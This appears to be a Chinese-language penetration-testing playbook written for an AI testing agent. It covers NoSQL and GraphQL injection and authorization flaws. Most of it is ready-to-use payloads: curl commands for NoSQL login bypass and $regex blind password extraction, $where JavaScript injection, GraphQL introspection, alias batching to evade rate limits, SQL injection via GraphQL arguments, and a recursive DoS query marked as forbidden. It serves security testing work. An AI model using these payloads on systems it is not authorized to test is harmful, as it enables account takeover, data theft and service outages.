# NoSQL 注入 + GraphQL 注入 / 鉴权问题

## Triggers (何时用)

- 响应里看到 `_id` 是 24 hex(MongoDB ObjectId)
- 报错含 `MongoError` / `BSON`
- Stack 用 Express + Mongoose / Meteor / Strapi / Parse
- GraphQL 端点 `/graphql` / `/api/graphql` / `/v1/graphql`
- 请求 Body 含 `{"query":"...","variables":{...}}`

## Coverage points (查什么)

- **NoSQL Operator 注入**:`{username:{$ne:null}}` 万能登录,`[$ne]=null` form-data 语法。详见 Reference。
- **NoSQL $where 注入**:JS 表达式,RCE-lite。详见 Reference。
- **NoSQL 盲注**:`$regex` 逐字符二分。详见 Reference。
- **GraphQL per-resolver 鉴权**:REST 鉴权在路由层,GraphQL 要落每个 resolver,漏一个就爆。详见 Reference。
- **GraphQL 别名滥用**:单请求查 1000 用户绕速率限制。详见 Reference。
- **GraphQL SQL/NoSQL 透传**:参数传到后端 SQL,注入路径不变。详见 Reference。

## Common misses (AI 常忘)

- **NoSQL 注入但 ORM 用了字符串校验** —— Mongoose 默认会 cast,`{$ne:null}` 失败。看版本和模式。
- **GraphQL 鉴权要落每个 resolver** —— REST 在路由层,GraphQL 漏一个就爆
- **Introspection 开启 = 信息泄露但低危** —— 几乎所有公司已知,关掉很简单
- **别名爆破能绕速率但抓不到敏感数据** —— 不算漏洞
- **能万能登录但只是测试号** —— 要登到管理员 / 真实用户才值钱

## Verification (verified 标准)

- NoSQL 万能登录:`{"email":{"$ne":""},"password":{"$ne":""}}` 返回管理员/真实用户 = 真;Mongoose cast 失败 = 误报
- GraphQL 越权:普通用户 token 查到 admin 字段(密码 hash / 内部用户)= 高危;只抓到公开数据 = 不算

## Related playbooks

- 发现 GraphQL → 全 schema 抽出来,丢 `targets/<X>/surface.md`
- 找到鉴权过宽 → `skills/api-logic/idor-bola.md`

## Reference (深度参考 — AI 可能不会的细节)

### NoSQL Operator 注入(关键!)

MongoDB 接受 JSON-like 查询,`{username: input}` 变 `{username: {$ne: null}}` 就能万能登录:

```bash
# 万能登录(JSON body 时)
curl -X POST https://target.com/login \
  -H 'Content-Type: application/json' \
  -d '{"username":{"$ne":null},"password":{"$ne":null}}'

# Form-data 用 [] 语法
curl -X POST https://target.com/login \
  -d 'username[$ne]=null&password[$ne]=null'

# 或用 $regex
curl -X POST https://target.com/login \
  -d '{"username":"admin","password":{"$regex":".*"}}'
```

### NoSQL 盲注(逐位猜密码)

```bash
# $regex + 二分(逐字符)
curl -X POST https://target.com/login \
  -d '{"username":"admin","password":{"$regex":"^a"}}'  # 200 → 密码以 a 开头
  -d '{"username":"admin","password":{"$regex":"^b"}}'  # 401 → 不是 b
```

### NoSQL $where 注入(JavaScript 表达式)

```javascript
// $where 接受 JS,等于 RCE-lite
{"$where": "this.username == 'admin' || sleep(5000)"}
{"$where": "function(){return Object.keys(this).indexOf('admin')>=0}"}
```

### GraphQL

#### 1. Introspection(摸 schema)

```bash
# 一发问出全部 Type / Field
curl -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{__schema{types{name fields{name type{name}}}}}"}'
```

如果生产开了 Introspection → **本身就是低危**,顺便摸出所有接口。

工具自动化:
- `clairvoyance` —— 关 Introspection 也能字段爆破
- `inql` —— Burp 插件
- `graphql-voyager` —— 可视化 schema

#### 2. 鉴权过宽(GraphQL 第一大坑)

REST 鉴权一般在路由层,GraphQL 鉴权要落到**每个 resolver** —— 漏一个就爆:

```graphql
# 普通用户的 query 套个 admin 字段
query {
  me { id name }
  allUsers {                    # ← 后端忘了加鉴权
    id name email phoneNumber
  }
}
```

**测试方法**:从 schema 抽出所有"列表 / admin / internal / 全员"字眼的字段,普通号请求一遍。

#### 3. 别名滥用(批量越权)

```graphql
# 单请求查 1000 个用户(绕速率限制)
query {
  u1: user(id: 1) { name email }
  u2: user(id: 2) { name email }
  u3: user(id: 3) { name email }
  ...
  u1000: user(id: 1000) { name email }
}
```

绕过的是**速率限制 / 风控**,而非鉴权 —— 配合 IDOR 用。

#### 4. SQL/NoSQL 注入(透传)

GraphQL 后端接 SQL,参数还是会传到 SQL,**注入路径不变**:

```graphql
query { user(id: "1' OR '1'='1") { name } }
```

试 `'` / `\\` / `${...}`(模板注入)/ `__proto__`(原型污染)。

#### 5. 拒绝服务(慎用,L1 红线)

深度递归 query 可拖垮服务,**禁止**:

```graphql
# 这种会 DoS,L1 不允许
query Bad { users { posts { comments { author { posts { ... } } } } } }
```

报告里说"理论可 DoS,未实测",列 payload 即可。
